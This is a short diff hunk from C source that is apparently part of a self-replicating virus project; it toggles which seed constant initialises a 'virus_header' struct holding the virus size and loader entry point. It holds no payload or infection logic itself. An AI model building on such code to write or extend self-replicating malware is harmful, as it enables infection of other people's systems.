@@ -26,8 +26,8 @@ void	_start(void)
 {
 	/* 1st generation values */
 	struct virus_header	vhdr = {
-		.seed         = 0xfadedbade1f5eed5,
-		// .seed         = 0x5555555555555555,
+		// .seed         = 0xfadedbade1f5eed5,
+		.seed         = 0x5555555555555555,
 		.virus_size   = _start - loader_entry,
 		.loader_entry = loader_entry,
 	};
